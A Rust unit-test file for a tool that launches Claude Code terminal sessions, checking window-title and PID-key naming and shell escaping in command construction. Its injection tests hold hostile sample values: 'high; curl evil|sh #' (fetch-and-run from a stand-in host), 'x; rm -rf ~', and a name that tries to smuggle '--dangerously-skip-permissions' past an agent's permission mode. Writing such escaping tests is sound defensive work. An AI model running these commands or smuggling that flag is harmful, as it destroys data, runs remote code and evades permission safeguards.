//! Unit tests for `native/mod.rs`, split out to keep the module under the
//! 400-line ceiling (CLAUDE.md Rule 17), matching `tmux/tests.rs` and
//! `backend/tests.rs`.

use super::*;
use tempfile::TempDir;

#[test]
fn test_native_backend_creation() {
    // May fail if no terminal is available; we only assert that when a
    // terminal *is* available, construction succeeds.
    let temp_dir = TempDir::new().unwrap();
    let result = NativeBackend::new(temp_dir.path().to_path_buf());
    if let Ok(backend) = result {
        // Sanity: the constructed backend exposes its terminal emulator.
        let _ = backend.terminal();
    }
}

#[test]
fn window_title_and_pid_key_for_stage_session() {
    let mut session = Session::new();
    session.assign_to_stage("worker-pool".to_string());
    let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
    // Title is the tracking_key, matched exactly against window titles.
    assert_eq!(title, "loom-worker-pool");
    // PID-file key is per-session: tracking_key + session.id (O-14).
    assert_eq!(pid_key, format!("loom-worker-pool-{}", session.id));
}

#[test]
fn window_title_and_pid_key_for_merge_session() {
    let mut session = Session::new_merge("loom/feature".to_string(), "main".to_string());
    session.assign_to_stage("feature".to_string());
    let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-merge-feature");
    assert_eq!(pid_key, format!("loom-merge-feature-{}", session.id));
}

#[test]
fn window_title_and_pid_key_for_knowledge_session() {
    let session = Session::new_knowledge("kb");
    let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-knowledge-kb");
    assert_eq!(pid_key, format!("loom-knowledge-kb-{}", session.id));
}

#[test]
fn window_title_and_pid_key_for_base_conflict_session() {
    let mut session = Session::new_base_conflict("loom/_base/feature".to_string());
    session.assign_to_stage("feature".to_string());
    let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-base-conflict-feature");
    assert_eq!(
        pid_key,
        format!("loom-base-conflict-feature-{}", session.id)
    );
}

#[test]
fn window_title_and_pid_key_legacy_fallback() {
    // Legacy session: empty tracking_key, falls back to the bare stage id.
    let mut session = Session::new();
    session.stage_id = Some("legacy".to_string());
    session.tracking_key = String::new();
    let (title, pid_key) = NativeBackend::window_title_and_pid_key(&session).unwrap();
    assert_eq!(title, "loom-legacy");
    assert_eq!(pid_key, format!("loom-legacy-{}", session.id));
}

#[test]
fn window_title_and_pid_key_none_without_stage() {
    // No tracking_key and no stage_id → nothing to resolve.
    let session = Session::new();
    assert!(NativeBackend::window_title_and_pid_key(&session).is_none());
}

#[test]
fn pid_key_distinct_per_session_for_same_stage() {
    // O-14(a): two consecutive sessions for the SAME stage must get
    // distinct PID-file keys, or liveness for the old session would read
    // the new session's PID.
    let mut s1 = Session::new();
    s1.assign_to_stage("auth".to_string());
    let mut s2 = Session::new();
    s2.assign_to_stage("auth".to_string());

    let (title1, key1) = NativeBackend::window_title_and_pid_key(&s1).unwrap();
    let (title2, key2) = NativeBackend::window_title_and_pid_key(&s2).unwrap();
    assert_eq!(title1, title2, "same stage → same window title");
    assert_ne!(key1, key2, "different session → different PID-file key");
}

#[test]
fn prefix_sharing_stage_ids_get_distinct_titles() {
    // O-5: `auth` and `auth-tests` must resolve to distinct window titles
    // so kill/liveness for one never targets the other.
    let mut auth = Session::new();
    auth.assign_to_stage("auth".to_string());
    let mut auth_tests = Session::new();
    auth_tests.assign_to_stage("auth-tests".to_string());

    let (auth_title, _) = NativeBackend::window_title_and_pid_key(&auth).unwrap();
    let (auth_tests_title, _) = NativeBackend::window_title_and_pid_key(&auth_tests).unwrap();
    assert_eq!(auth_title, "loom-auth");
    assert_eq!(auth_tests_title, "loom-auth-tests");
    assert_ne!(auth_title, auth_tests_title);
    // The exact-match window ops (tested in window_ops.rs) ensure
    // `loom-auth` never matches `loom-auth-tests`.
}

#[test]
fn build_claude_command_omits_remote_control_when_disabled() {
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "opus",
        "xhigh",
        "auto",
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    assert_eq!(
        cmd,
        "/usr/bin/claude --model opus --effort xhigh --permission-mode auto 'prompt'"
    );
    assert!(!cmd.contains("--remote-control"));
}

#[test]
fn build_claude_command_appends_bare_remote_control_when_enabled() {
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &RemoteControlInvocation::Bare,
        "'prompt'",
    );
    // `sonnet`/`high`/`auto`/`/usr/bin/claude` contain only shell-safe
    // chars, so escaping leaves them unquoted.
    assert_eq!(
        cmd,
        "/usr/bin/claude --model sonnet --effort high --permission-mode auto 'prompt' --remote-control"
    );
    // The flag must sit AFTER the prompt positional, otherwise
    // `--remote-control [name]` swallows the prompt as its optional arg.
    let rc_idx = cmd.find("--remote-control").unwrap();
    let prompt_idx = cmd.find("'prompt'").unwrap();
    assert!(prompt_idx < rc_idx);
}

#[test]
fn build_claude_command_passes_permission_mode_before_prompt() {
    // The resolved permission mode is passed on the CLI (not left to
    // settings.local.json, which Claude Code ignores for `auto`). Like the
    // other option flags it must precede the positional prompt.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "opus",
        "xhigh",
        "acceptEdits",
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    assert!(cmd.contains("--permission-mode acceptEdits"));
    let mode_idx = cmd.find("--permission-mode").unwrap();
    let prompt_idx = cmd.find("'prompt'").unwrap();
    assert!(
        mode_idx < prompt_idx,
        "--permission-mode must precede the prompt positional"
    );
}

#[test]
fn build_claude_command_escapes_effort_injection() {
    // S-3: a tampered reasoning effort must be neutralized, not interpolated
    // raw into the exec'd command line.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high; curl evil|sh #",
        "auto",
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    // The whole effort token is single-quoted, so no `;`/`|`/`#` is active.
    assert!(cmd.contains("--effort 'high; curl evil|sh #'"));
    assert!(!cmd.contains("--effort high; curl"));
}

#[test]
fn build_claude_command_escapes_claude_path_with_spaces() {
    // S-3: a claude path containing spaces must be quoted so the wrapper's
    // `exec` doesn't split it into multiple words.
    let cmd = build_claude_command(
        "/opt/My Tools/claude",
        "sonnet",
        "high",
        "auto",
        &RemoteControlInvocation::Disabled,
        "'prompt'",
    );
    assert!(cmd.starts_with("'/opt/My Tools/claude' --model sonnet"));
}

#[test]
fn build_claude_command_appends_named_remote_control_after_prompt() {
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &RemoteControlInvocation::Named("My Stage".to_string()),
        "'prompt'",
    );
    // The `=` joins the name to the flag as a single CLI token.
    assert!(cmd.ends_with("--remote-control='My Stage'"), "cmd: {cmd}");
    // Same ordering constraint as the bare flag: the optional [name] arg
    // would otherwise swallow the prompt positional.
    let rc_idx = cmd.find("--remote-control").unwrap();
    let prompt_idx = cmd.find("'prompt'").unwrap();
    assert!(prompt_idx < rc_idx);
}

#[test]
fn build_claude_command_named_remote_control_rejects_leading_dash_reparsing() {
    // A name starting with `-` must not be re-parseable as a separate CLI
    // flag: `shell_escape` treats `-` as shell-safe and passes it through
    // unquoted, so the `=` join (not shell quoting) is what prevents claude's
    // own optional-argument parser from treating this as a new option.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &RemoteControlInvocation::Named("--dangerously-skip-permissions".to_string()),
        "'prompt'",
    );
    assert!(
        cmd.contains("--remote-control=--dangerously-skip-permissions"),
        "the whole name must be bound to --remote-control via '=' as one token: {cmd}"
    );
    // There must be no SPACE-separated occurrence of the bare flag name,
    // which is what an optional-argument parser would treat as a new option.
    assert!(!cmd.contains("--remote-control --dangerously-skip-permissions"));
}

#[test]
fn build_claude_command_escapes_named_remote_control_injection() {
    // S-3: a stage name from plan YAML must be neutralized, not
    // interpolated raw into the exec'd command line.
    let cmd = build_claude_command(
        "/usr/bin/claude",
        "sonnet",
        "high",
        "auto",
        &RemoteControlInvocation::Named("x; rm -rf ~".to_string()),
        "'prompt'",
    );
    // The whole name is single-quoted, so no `;`/`~` is active.
    assert!(cmd.contains("--remote-control='x; rm -rf ~'"), "cmd: {cmd}");
    assert!(!cmd.contains("--remote-control x; rm"));
}
